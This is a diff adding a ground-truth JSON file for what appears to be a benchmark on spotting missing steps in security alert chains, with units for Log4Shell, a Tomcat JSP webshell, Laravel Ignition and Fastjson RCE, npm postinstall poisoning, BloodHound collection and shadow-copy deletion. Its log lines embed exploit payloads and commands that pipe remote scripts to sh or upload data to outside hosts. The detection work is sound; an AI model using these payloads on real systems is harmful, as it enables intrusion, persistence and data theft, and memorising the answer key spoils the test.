@@ -1,0 +1,9555 @@
+{
+ "schema": "step-gt-v1",
+ "units": {
+  "1001": {
+   "unit": 1001,
+   "stratum": "exact",
+   "gt_class": "exact",
+   "gt_case": "CASE-001",
+   "technique": "Log4Shell JNDI 注入（LDAP 回连 + Base64 命令）",
+   "source_sequence": [
+    "waf",
+    "web",
+    "rasp",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "label": "Web 入口（/api/v2/login）",
+     "n_lines": 2,
+     "lines": [
+      "/api/v2/login username=${jndi:ldap://10.20.7.31:1389/Basic/Command/Base64/dW5hbWUgLWE=} Mozilla/5.0 (Windows N",
+      "/api/v2/login username=${jndi:ldap://10.20.7.31:1389/Basic/Command/Base64/dW5hbWUgLWE=} Mozilla/5.0 (Windows N"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-java-152.ops-corp.com/api/v2/login {\"jndi\": \"ldap://10.20.7.31:1389\"} Mozilla/5.0 (Windows NT 10.0"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（uname）",
+     "n_lines": 1,
+     "lines": [
+      "uname -a /usr/bin/uname uname -a <== /bin/sh -c 'uname -a' <== /usr/bin/java -jar /opt/app/auth-service.jar"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3
+     ],
+     "variant": "full",
+     "n_lines": 4,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3
+     ],
+     "variant": "del1",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "del2",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（uname）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3
+     ],
+     "variant": "delweb",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [
+      {
+       "step_id": "S1",
+       "missing_sources": [
+        "web"
+       ]
+      }
+     ],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [
+      "web"
+     ],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    }
+   ]
+  },
+  "1021": {
+   "unit": 1021,
+   "stratum": "exact",
+   "gt_class": "exact",
+   "gt_case": "CASE-002",
+   "technique": "Apache Tomcat PUT 上传 JSP webshell + DNS C2 心跳",
+   "source_sequence": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "label": "Web 入口（/uploads/cmd.jsp/）",
+     "n_lines": 2,
+     "lines": [
+      "/uploads/cmd.jsp/ PUT <%@ page import=\"java.util.*\"%><% Runtime.getRuntime().exec(\"id\")%> Mozilla/5.0 (Windows",
+      "/uploads/cmd.jsp/ PUT <%@ page import=\"java.util.*\"%><% Runtime.getRuntime().exec(\"id\")%> Mozilla/5.0 (Windows"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-tomcat-77.ops-corp.com/uploads/cmd.jsp/ {\"upload\": \"cmd.jsp\", \"rce\": \"exec\"} Mozilla/5.0 (Windows "
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（id;）",
+     "n_lines": 1,
+     "lines": [
+      "id; hostname /usr/bin/id id; hostname <== /bin/sh -c 'id; hostname' <== /usr/local/tomcat/bin/catalina.sh"
+     ]
+    },
+    {
+     "step_id": "S4",
+     "sources": [
+      "dns"
+     ],
+     "label": "DNS C2（a16f2990.vqmxld-2b71.net）",
+     "n_lines": 3,
+     "lines": [
+      "a16f2990.vqmxld-2b71.net A 10.10.23.180",
+      "ae823f83.vqmxld-2b71.net A 10.10.36.219",
+      "af0c3d5f.vqmxld-2b71.net A 203.0.113.109"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3,
+      4,
+      5,
+      6
+     ],
+     "variant": "full",
+     "n_lines": 7,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3",
+      "S4"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3,
+      4,
+      5,
+      6
+     ],
+     "variant": "del1",
+     "n_lines": 6,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S3",
+      "S4"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3
+     ],
+     "variant": "del2",
+     "n_lines": 3,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2",
+      "S4"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S4",
+       "label": "DNS C2（a16f2990.vqmxld-2b71.net）",
+       "sources": [
+        "dns"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3,
+      4,
+      5,
+      6
+     ],
+     "variant": "delweb",
+     "n_lines": 6,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3",
+      "S4"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [
+      {
+       "step_id": "S1",
+       "missing_sources": [
+        "web"
+       ]
+      }
+     ],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [
+      "web"
+     ],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    }
+   ]
+  },
+  "1042": {
+   "unit": 1042,
+   "stratum": "exact",
+   "gt_class": "exact",
+   "gt_case": "CASE-003",
+   "technique": "Windows 计划任务持久化（schtasks /create /sc minute）",
+   "source_sequence": [
+    "waf",
+    "rasp",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf"
+     ],
+     "label": "Web 入口（/api/v1/scheduler/run）",
+     "n_lines": 1,
+     "lines": [
+      "/api/v1/scheduler/run cmd=schtasks /create /tn Upd /sc minute /mo 5 /tr C:\\Windows\\Temp\\u.exe Mozilla/5.0 (Win"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-tomcat-47.ops-corp.com/api/v1/scheduler/run {\"cmd_inject\": \"schtasks /create /sc minute\", \"sched_t"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（schtasks）",
+     "n_lines": 1,
+     "lines": [
+      "schtasks /create /tn Upd /sc minute /mo 5 /tr C:\\Windows\\Temp\\u.exe schtasks.exe java.exe -jar C:\\svc\\gw.jar <"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2
+     ],
+     "variant": "full",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2
+     ],
+     "variant": "del1",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（schtasks）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1061": {
+   "unit": 1061,
+   "stratum": "exact",
+   "gt_class": "exact",
+   "gt_case": "CASE-004",
+   "technique": "Laravel Ignition 调试模式反序列化 RCE (CVE-2021-3129)",
+   "source_sequence": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "label": "Web 入口（/index.php）",
+     "n_lines": 2,
+     "lines": [
+      "/index.php _ignition/execute-solution {\"viewFile\":\"phar:///tmp/7be2.phar\"} Mozilla/5.0 (Windows NT 10.0; Win64",
+      "/index.php _ignition/execute-solution {\"viewFile\":\"phar:///tmp/7be2.phar\"} Mozilla/5.0 (Windows NT 10.0; Win64"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-php-31.ops-corp.com/index.php {\"viewFile\": \"phar:///tmp/7be2.phar\", \"solution\": \"execute-solution\""
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（id）",
+     "n_lines": 1,
+     "lines": [
+      "id /bin/id id <== /bin/sh -c 'id' <== php-fpm: pool www"
+     ]
+    },
+    {
+     "step_id": "S4",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（echo）",
+     "n_lines": 1,
+     "lines": [
+      "echo \"* * * * * curl -s http://10.20.5.19/x|sh\" >> /var/spool/cron/root echo echo \"* * * * * curl <== /usr/sbi"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3,
+      4
+     ],
+     "variant": "full",
+     "n_lines": 5,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3",
+      "S4"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3,
+      4
+     ],
+     "variant": "del1",
+     "n_lines": 4,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S3",
+      "S4"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3
+     ],
+     "variant": "del2",
+     "n_lines": 3,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2",
+      "S4"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S4",
+       "label": "主机命令（echo）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3,
+      4
+     ],
+     "variant": "delweb",
+     "n_lines": 4,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3",
+      "S4"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [
+      {
+       "step_id": "S1",
+       "missing_sources": [
+        "web"
+       ]
+      }
+     ],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [
+      "web"
+     ],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    }
+   ]
+  },
+  "1081": {
+   "unit": 1081,
+   "stratum": "exact",
+   "gt_class": "exact",
+   "gt_case": "CASE-005",
+   "technique": "文件上传落地 WebShell 后删除卷影并批量加密共享目录",
+   "source_sequence": [
+    "rasp",
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-php-12.ops-corp.com/wp-admin/admin-ajax.php?action=upload {\"upload\": \"upd.php\", \"cmd\": \"vssadmin d"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（cipher）",
+     "n_lines": 1,
+     "lines": [
+      "cipher /e /s:C:\\inetpub\\data cipher.exe cipher.exe /e /s:C:\\inetpub\\data <== php-cgi.exe"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（vssadmin）",
+     "n_lines": 1,
+     "lines": [
+      "vssadmin delete shadows /all /quiet cmd.exe cmd.exe /c vssadmin delete shadows /all /quiet <== php-cgi.exe"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2
+     ],
+     "variant": "full",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2
+     ],
+     "variant": "del1",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（cipher）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（cipher）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（cipher）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（cipher）",
+       "sources": [
+        "hids"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（vssadmin）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1102": {
+   "unit": 1102,
+   "stratum": "exact",
+   "gt_class": "exact",
+   "gt_case": "CASE-006",
+   "technique": "BloodHound 图谱采集（SharpHound All + LDAP 批量查询）",
+   "source_sequence": [
+    "hids",
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（SharpHound.exe）",
+     "n_lines": 1,
+     "lines": [
+      "SharpHound.exe -c All --zipfilename bh.zip SharpHound.exe SharpHound.exe -c All <== CORP\\jdoe"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（Compress-Archive）",
+     "n_lines": 1,
+     "lines": [
+      "Compress-Archive C:\\Users\\jdoe\\bh_*.json -Destination bh.zip powershell.exe Compress-Archive <== CORP\\jdoe"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（curl.exe）",
+     "n_lines": 1,
+     "lines": [
+      "curl.exe -T bh.zip http://10.20.7.31/up curl.exe curl.exe -T bh.zip http://10.20.7.31/up <== CORP\\jdoe"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2
+     ],
+     "variant": "full",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2
+     ],
+     "variant": "del1",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（Compress-Archive）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（Compress-Archive）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（Compress-Archive）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（Compress-Archive）",
+       "sources": [
+        "hids"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（curl.exe）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1121": {
+   "unit": 1121,
+   "stratum": "exact",
+   "gt_class": "exact",
+   "gt_case": "CASE-007",
+   "technique": "npm 依赖 postinstall 钩子投毒（安装期拉取远程脚本）",
+   "source_sequence": [
+    "waf",
+    "web",
+    "rasp",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "label": "Web 入口（/api/v2/pipeline/run）",
+     "n_lines": 2,
+     "lines": [
+      "/api/v2/pipeline/run job=deps&pkg=lodahs-build-utils@2.3.1&hook=postinstall Mozilla/5.0 (Windows NT 10.0; Win6",
+      "/api/v2/pipeline/run job=deps&pkg=lodahs-build-utils@2.3.1&hook=postinstall Mozilla/5.0 (Windows NT 10.0; Win6"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-node-41.ops-corp.com/api/v2/pipeline/run {\"npm_lifecycle\": \"postinstall\", \"spawn\": \"sh -c\"} Mozill"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（curl）",
+     "n_lines": 1,
+     "lines": [
+      "curl 10.20.5.19/p.sh|sh /bin/sh curl 10.20.5.19/p.sh|sh <== /bin/sh -c 'install.js' <== node /usr/lib/npm"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3
+     ],
+     "variant": "full",
+     "n_lines": 4,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3
+     ],
+     "variant": "del1",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "del2",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（curl）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3
+     ],
+     "variant": "delweb",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [
+      {
+       "step_id": "S1",
+       "missing_sources": [
+        "web"
+       ]
+      }
+     ],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [
+      "web"
+     ],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    }
+   ]
+  },
+  "1007": {
+   "unit": 1007,
+   "stratum": "variant",
+   "gt_class": "family_variant",
+   "gt_case": "CASE-001",
+   "technique": "Fastjson autoType（JdbcRowSetImpl JNDI，JSON body）",
+   "source_sequence": [
+    "waf",
+    "web",
+    "rasp",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "label": "Web 入口（/api/user/profile）",
+     "n_lines": 2,
+     "lines": [
+      "/api/user/profile {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"url\":\"ldap://10.20.7.31\"} Mozilla/5.0 (iPhone; CPU",
+      "/api/user/profile {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"url\":\"ldap://10.20.7.31\"} Mozilla/5.0 (iPhone; CPU"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-java-119.ops-corp.com/api/user/profile {\"autoType\": \"JdbcRowSetImpl\"} Mozilla/5.0 (iPhone; CPU iPh"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（touch）",
+     "n_lines": 1,
+     "lines": [
+      "touch /tmp/.x <== /bin/sh -c 'touch /tmp/.x' <== /usr/bin/java -jar /opt/app/user-api.jar"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3
+     ],
+     "variant": "full",
+     "n_lines": 4,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3
+     ],
+     "variant": "del1",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "del2",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（touch）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
